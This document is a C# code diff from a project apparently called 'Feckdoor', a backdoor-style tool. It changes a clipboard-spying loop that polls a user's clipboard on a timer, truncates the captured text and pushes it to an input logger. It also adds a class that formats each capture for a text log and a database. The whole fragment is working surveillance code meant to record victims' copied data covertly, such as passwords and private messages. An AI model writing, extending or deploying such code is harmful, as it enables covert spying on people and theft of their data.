@@ -1,5 +1,5 @@
 ﻿using Serilog;
-using System.Runtime.InteropServices;
+using System.Text;
 
 namespace Feckdoor.InputLog
 {
@@ -25,7 +25,11 @@ namespace Feckdoor.InputLog
 				{
 					string? Data = GetClipboardDataNative();
 					if (Data != null)
-						InputLogger.UndoneQueue.Enqueue(new ClipboardChangeEntry(DateTime.Now, Data[..100]));
+					{
+						if (Data.Length > 100)
+							Data = Data[..100] + " (truncated)";
+						InputLogWriter.Push(new ClipboardChangeEntry(DateTime.Now, Data));
+					}
 				}
 				PrevSequenceNum = newSeqNum;
 				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay, ct);
@@ -73,6 +77,35 @@ namespace Feckdoor.InputLog
 		{
 			Dispose(disposing: true);
 			GC.SuppressFinalize(this);
+		}
+	}
+
+	internal class ClipboardChangeEntry : InputLogEntry
+	{
+		private readonly string Clipboard;
+
+		public override string PlainTextMessage
+		{
+			get
+			{
+				var sb = new StringBuilder();
+				sb.AppendLine(Environment.NewLine);
+				sb.AppendLine("##### Clipboard change #####");
+				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
+				sb.Append("Data: \"").Append(Clipboard).AppendLine("\"");
+				sb.AppendLine("##### Clipboard change #####");
+				return sb.ToString();
+			}
+		}
+
+		public override object[] DbMessage
+		{
+			get => new object[] { Clipboard };
+		}
+
+		public ClipboardChangeEntry(DateTime timeStamp, string clipboard) : base(timeStamp)
+		{
+			Clipboard = clipboard;
 		}
 	}
 }
